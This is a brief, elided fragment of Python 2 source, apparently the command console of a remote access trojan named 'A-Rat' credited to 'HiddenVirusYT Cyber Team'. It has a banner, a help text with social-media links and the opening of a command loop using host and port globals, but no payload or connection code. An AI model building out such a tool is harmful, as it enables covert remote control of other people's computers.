...
\t [*] Versions : 1.0.0
\t [*] Coded By ./HiddenVirusYT
\t [*] HiddenVirusYT Cyber Team
  """)
...
def help():
 print("""
  ...
  FB : https://m.facebook.com/HiddenVirusYT
  FP : https://m.facebook.com/HiddenVirusYT143cyberteam\n""")
       
def main():
    global host, port, output

    while True:
        cmd = raw_input("[*] A-Rat@HiddenVirusYT143:~# ").lower()
